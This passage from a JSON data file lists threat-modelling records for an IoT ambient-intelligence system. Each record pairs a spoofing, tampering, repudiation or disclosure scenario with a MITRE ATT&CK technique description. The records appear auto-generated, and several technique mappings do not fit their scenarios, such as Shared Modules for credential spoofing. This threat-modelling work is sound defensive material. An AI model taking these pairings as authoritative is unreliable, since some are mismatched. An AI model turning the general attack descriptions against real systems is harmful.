                    "Assumption": "Cloud storage does not have proper audit trails",
                    "Role": "Security Team",
                    "Condition": "Lack of logging and monitoring for cloud resources"
                },
                {
                    "Assumption": "High-value data stored in the cloud",
                    "Role": "Data Owner",
                    "Condition": "Sensitive data stored without additional protections"
                }
            ],
            "Potential Impact": "Unauthorized access and potential tampering with data and access controls.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Cloud Storage",
                "Access Control",
                "Misconfiguration"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "Malicious software installed on the communication infrastructure systems escalates privileges to control network traffic.",
            "Assumptions": [
                {
                    "Assumption": "Network devices have exploitable firmware or software vulnerabilities",
                    "Role": "Network Administrator",
                    "Condition": "Devices not updated with latest security patches"
                },
                {
                    "Assumption": "No network segmentation or isolation",
                    "Role": "Network Planner",
                    "Condition": "Network designed without proper segmentation"
                },
                {
                    "Assumption": "Lack of intrusion detection systems",
                    "Role": "Security Team",
                    "Condition": "Absence of IDS/IPS solutions"
                }
            ],
            "Potential Impact": "Control over network traffic leading to potential data interception and manipulation.",
            "MITRE ATT&CK Keywords": [
                "Elevation of Privilege",
                "Communication Infrastructure",
                "Network Traffic",
                "Malicious Software"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "29",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a legitimate user's credentials to gain unauthorized access to control the Ambient Intelligence system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the user's credentials",
                    "Role": "Attacker",
                    "Condition": "Credentials are leaked or stolen"
                },
                {
                    "Assumption": "The system does not have multi-factor authentication in place",
                    "Role": "System Administrator",
                    "Condition": "Single factor authentication is used"
                },
                {
                    "Assumption": "There are no effective monitoring or anomalous behavior detection mechanisms",
                    "Role": "Security Team",
                    "Condition": "Monitoring tools are insufficient or non-existent"
                }
            ],
            "Potential Impact": "Compromise of system security, unauthorized control of devices, and disruption of user comfort",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "credential access",
                "authentication",
                "network"
            ],
            "mitre_technique": {
                "name": "Shared Modules",
                "description": "Adversaries may execute malicious payloads via loading shared modules. Shared modules are executable files that are loaded into processes to provide access to reusable code, such as specific custom functions or invoking OS API functions (i.e., [Native API](https://attack.mitre.org/techniques/T1106)).\n\nAdversaries may use this functionality as a way to execute arbitrary payloads on a victim system. For example, adversaries can modularize functionality of their malware into shared objects that perform various functions such as managing C2 network communications or execution of specific actions on objective.\n\nThe Linux & macOS module loader can load and execute shared objects from arbitrary local paths. This functionality resides in `dlfcn.h` in functions such as `dlopen` and `dlsym`. Although macOS can execute `.so` files, common practice uses `.dylib` files.(Citation: Apple Dev Dynamic Libraries)(Citation: Linux Shared Libraries)(Citation: RotaJakiro 2021 netlab360 analysis)(Citation: Unit42 OceanLotus 2017)\n\nThe Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. This functionality resides in `NTDLL.dll` and is part of the Windows [Native API](https://attack.mitre.org/techniques/T1106) which is called from functions like `LoadLibrary` at run time.(Citation: Microsoft DLL)",
                "id": "attack-pattern--0a5231ec-41af-4a35-83d0-6bdf11f28c65",
                "technique_id": "T1129"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker impersonates a trusted IoT device to inject false data into the system.",
            "Assumptions": [
                {
                    "Assumption": "The attacker can mimic the communication protocol of the trusted device",
                    "Role": "Attacker",
                    "Condition": "Knowledge of protocol details"
                },
                {
                    "Assumption": "Device validation methods are weak or non-existent",
                    "Role": "Developer",
                    "Condition": "Lack of secure device registration process"
                },
                {
                    "Assumption": "The network lacks encryption mechanisms",
                    "Role": "System Administrator",
                    "Condition": "Communication occurs over an unencrypted channel"
                }
            ],
            "Potential Impact": "Integrity of data is compromised, decision making processes disrupted",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "impersonation",
                "data manipulation",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses social engineering tactics to trick a legitimate user into revealing sensitive authentication information.",
            "Assumptions": [
                {
                    "Assumption": "Users are not adequately trained in security awareness",
                    "Role": "User",
                    "Condition": "Lack of security training programs"
                },
                {
                    "Assumption": "Phishing detection mechanisms are weak or non-existent",
                    "Role": "Security Team",
                    "Condition": "Inadequate email filtering and user education"
                },
                {
                    "Assumption": "The attacker has access to communications channels used by the users",
                    "Role": "Attacker",
                    "Condition": "Active on communication platforms utilized by users"
                }
            ],
            "Potential Impact": "Loss of data confidentiality, unauthorized access to system controls",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "credential access",
                "phishing",
                "network"
            ],
            "mitre_technique": {
                "name": "Keylogging",
                "description": "Adversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. In order to increase the likelihood of capturing credentials quickly, an adversary may also perform actions such as clearing browser cookies to force users to reauthenticate to systems.(Citation: Talos Kimsuky Nov 2021)\n\nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.(Citation: Adventures of a Keystroke) Some methods include:\n\n* Hooking API callbacks used for processing keystrokes. Unlike [Credential API Hooking](https://attack.mitre.org/techniques/T1056/004), this focuses solely on API functions intended for processing keystroke data.\n* Reading raw keystroke data from the hardware buffer.\n* Windows Registry modifications.\n* Custom drivers.\n* [Modify System Image](https://attack.mitre.org/techniques/T1601) may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.(Citation: Cisco Blog Legacy Device Attacks) ",
                "id": "attack-pattern--09a60ea3-a8d1-4ae5-976e-5783248b72a4",
                "technique_id": "T1056.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters the data collected by sensors to manipulate the system's operating environment decisions.",
            "Assumptions": [
                {
                    "Assumption": "Physical access to sensors",
                    "Role": "Attacker",
                    "Condition": "Sensors are installed in locations with weak physical security"
                },
                {
                    "Assumption": "Lack of data integrity checks for sensor data",
                    "Role": "Developer",
                    "Condition": "Data validation mechanisms not implemented"
                },
                {
                    "Assumption": "Weaknesses in the communication protocol that enable alteration of data in transit",
                    "Role": "System Administrator",
                    "Condition": "Unsecured communication protocols"
                }
            ],
            "Potential Impact": "Data integrity compromised, environment decisions based on false data",
            "MITRE ATT&CK Keywords": [
                "data tampering",
                "sensor manipulation",
                "network",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker compromises the firmware of an actuator to control physical devices maliciously.",
            "Assumptions": [
                {
                    "Assumption": "Firmware update process is not secure",
                    "Role": "Developer",
                    "Condition": "Firmware updates lack authentication processes"
                },
                {
                    "Assumption": "Physical access to the actuator",
                    "Role": "Attacker",
                    "Condition": "Actuators are installed in unsecured locations"
                },
                {
                    "Assumption": "Lack of periodic integrity checks on firmware",
                    "Role": "System Administrator",
                    "Condition": "No mechanisms for firmware validation"
                }
            ],
            "Potential Impact": "Unauthorized control over physical devices, potential safety hazards",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "actuator control",
                "physical device"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies or replaces the AI/ML models with malicious models that make incorrect decisions.",
            "Assumptions": [
                {
                    "Assumption": "Access to the storage where AI/ML models are kept",
                    "Role": "Attacker",
                    "Condition": "Inadequate security of model storage locations"
                },
                {
                    "Assumption": "Insufficient monitoring of AI/ML model integrity",
                    "Role": "Developer",
                    "Condition": "Lack of integrity checks on stored models"
                },
                {
                    "Assumption": "Weak access controls for managing AI/ML models",
                    "Role": "System Administrator",
                    "Condition": "Poor access control mechanisms"
                }
            ],
            "Potential Impact": "Compromised decision-making, potential to influence environment settings maliciously",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "AI/ML manipulation",
                "data integrity",
                "machine learning"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
                "description": "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
                "id": "attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579",
                "technique_id": "T1562.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker denies performing a malicious action after compromising a user device to control the AmI system.",
            "Assumptions": [
                {
                    "Assumption": "Lack of comprehensive logging and monitoring",
                    "Role": "System Administrator",
                    "Condition": "Insufficient logging mechanisms"
                },
                {
                    "Assumption": "Inadequate user activity tracking",
                    "Role": "Developer",
                    "Condition": "Lack of user activity attribution"
                },
                {
                    "Assumption": "Weak authentication and access control mechanisms",
                    "Role": "System Administrator",
                    "Condition": "Weak or single-factor authentication"
                }
            ],
            "Potential Impact": "Inability to trace malicious actions, denial of responsible party identification",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging evasion",
                "denial",
                "attribution"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A legitimate user who performs an unauthorized action denies their involvement due to lack of tamperproof logs.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms are not tamper-resistant",
                    "Role": "Developer",
                    "Condition": "Logs are not protected against tampering"
                },
                {
                    "Assumption": "Insufficient user activity tracking",
                    "Role": "System Administrator",
                    "Condition": "Activity logs lack sufficient detail"
                },
                {
                    "Assumption": "No use of strong cryptographic techniques for logs",
                    "Role": "Developer",
                    "Condition": "Logs are not encrypted"
                }
            ],
            "Potential Impact": "Challenges in identifying and addressing user behavior, difficulty in enforcing accountability",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "tamperproof logs",
                "activity tracking",
                "cryptography"
            ],
            "mitre_technique": {
                "name": "Stage Capabilities",
                "description": "Adversaries may upload, install, or otherwise set up capabilities that can be used during targeting. To support their operations, an adversary may need to take capabilities they developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) or obtained ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) and stage them on infrastructure under their control. These capabilities may be staged on infrastructure that was previously purchased/rented by the adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) or was otherwise compromised by them ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities may also be staged on web services, such as GitHub or Pastebin, or on Platform-as-a-Service (PaaS) offerings that enable users to easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)\n\nStaging of capabilities can aid the adversary in a number of initial access and post-compromise behaviors, including (but not limited to):\n\n* Staging web resources necessary to conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) when a user browses to a site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)\n* Staging web resources for a link target to be used with spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)\n* Uploading malware or tools to a location accessible to a victim network to enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)\n* Installing a previously acquired SSL/TLS certificate to use to encrypt command and control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert)",
                "id": "attack-pattern--84771bc3-f6a0-403e-b144-01af70e5fda0",
                "technique_id": "T1608"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker manipulates system logs to erase traces of an intrusion into the data repository.",
            "Assumptions": [
                {
                    "Assumption": "Lack of secure log storage",
                    "Role": "System Administrator",
                    "Condition": "Logs are stored in insecure locations"
                },
                {
                    "Assumption": "Logging mechanisms fail to detect tampering",
                    "Role": "Developer",
                    "Condition": "No integrity checks on logs"
                },
                {
                    "Assumption": "The attacker has sufficient privileges to access and modify logs",
                    "Role": "Attacker",
                    "Condition": "Elevated privileges gained"
                }
            ],
            "Potential Impact": "Compromised ability to reconstruct the event timeline, hindrance in incident response processes",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "log manipulation",
                "data repository",
                "incident response"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker intercepts communication between sensors and the central system to access sensitive data.",
            "Assumptions": [
                {
                    "Assumption": "Communication channels are not encrypted",
                    "Role": "System Administrator",
                    "Condition": "Data transmitted in plaintext"
                },
                {
                    "Assumption": "Network lacks adequate intrusion detection systems",
                    "Role": "Security Team",
                    "Condition": "No network monitoring implemented"
                },
                {
                    "Assumption": "Attacker has access to network infrastructure",
                    "Role": "Attacker",
                    "Condition": "Physical or remote access to network components"
                }
            ],
            "Potential Impact": "Compromise of data confidentiality, exposure of sensitive user information",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "interception",
                "communication",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains unauthorized access to the data repository and extracts sensitive user data.",
            "Assumptions": [
                {
                    "Assumption": "Weak access control mechanisms on data repositories",
                    "Role": "System Administrator",
                    "Condition": "Inadequate protection of stored data"
                },
                {
                    "Assumption": "Insufficient auditing and monitoring of access logs",
                    "Role": "Security Team",
                    "Condition": "Lack of regular audits"
                },
                {
                    "Assumption": "Vulnerable or outdated software used in data repositories",
                    "Role": "Developer",
                    "Condition": "Unpatched vulnerabilities"
                }
            ],
            "Potential Impact": "Exposure of high-value sensitive data, potential data breaches",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unauthorized access",
                "data repository",
                "data breach"
            ],
            "mitre_technique": {
                "name": "Exploitation of Remote Services",
                "description": "Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Discovery](https://attack.mitre.org/techniques/T1046) or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services.(Citation: NVD CVE-2014-7169)\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068) as a result of lateral movement exploitation as well.",
                "id": "attack-pattern--9db0cf3a-a3c9-4012-8268-123b9db6fd82",
                "technique_id": "T1210"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker leverages a network vulnerability to eavesdrop on user device communications.",
            "Assumptions": [
                {
                    "Assumption": "Presence of unpatched network vulnerabilities",
                    "Role": "System Administrator",
                    "Condition": "Network devices not consistently updated"
                },
                {
                    "Assumption": "Lack of end-to-end encryption for user communications",
                    "Role": "Developer",
                    "Condition": "Data transmitted unencrypted"
                },
                {
                    "Assumption": "Network monitoring mechanisms are insufficient",
                    "Role": "Security Team",
                    "Condition": "Inadequate network traffic analysis"
                }
            ],
            "Potential Impact": "Compromise of data confidentiality, leaking of user interactions",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "eavesdropping",
                "network vulnerability",
                "user device"
            ],
            "mitre_technique": {
